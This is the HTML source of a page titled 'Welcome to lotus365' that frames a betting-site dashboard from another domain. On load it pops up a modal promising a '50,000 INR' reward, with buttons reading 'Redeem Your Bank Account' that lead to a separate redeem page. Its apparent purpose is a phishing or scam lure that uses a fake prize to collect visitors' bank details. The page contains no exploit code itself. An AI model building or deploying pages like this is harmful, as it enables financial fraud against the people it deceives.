<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Welcome to lotus365</title>
    <base href="/" />
    <meta content="" name="description" />
    <meta content="" name="keywords" />
    <!-- Favicons -->
    <link
      rel="shortcut icon"
      type="image/jpg"
      href="https://lotus365wins.com/assets/img/favicon.png"
    />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  </head>
  <body>
    <style>
      body {
        overflow: hidden; /* Hide scrollbars */
      }
    </style>

    <div id="myModal" class="modal fade" role="dialog">
      <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
          <div class="modal-body text-center">
            <img src="redeam.png" style="width: 80px" />
            <h1>50,000 INR</h1>
            <p>Redeem Amount</p>
            <a class="pre-order-btn" href="/Redeem_amount.html"
              >Redeem Your Bank Account</a
            >
          </div>
        </div>
      </div>
    </div>

    <style>
      .navbar-fixed-top {
        position: sticky;
        position: -webkit-sticky;
        top: 0;
        /*     z-index: 1; */
        background: #1f8066;
      }

      .navbar-fixed-top.cbp-af-header-shrink {
        padding: 10px 0;
      }
    </style>

    <script>
      $(document).ready(function () {
        $("#myModal").modal("show");
      });
    </script>

    <div class="container-fluid">
      <div class="row">
        <header class="navbar-fixed-top cbp-af-header">
          <nav>
            <img
              style="width: 180px; padding: 20px 10px 20px 10px"
              src="logo.png"
            />
            <a href="/Redeem_amount.html">
              <p
                style="
                  float: right;
                  color: #fffc00;
                  padding: 20px 10px 30px 10px;
                  font-weight: bold;
                "
              >
                Redeem Your Amount
              </p></a
            >
          </nav>
        </header>
      </div>

      <div class="row">
        <div class="">
          <iframe
            class="embed-responsive-item"
            src="https://lotus365.vip/m/dashboard"
            style="
              width: 100%;
              height: 900px;
              margin-top: -120px;
              position: relative;
            "
          ></iframe>
        </div>
      </div>
    </div>
  </body>
</html>
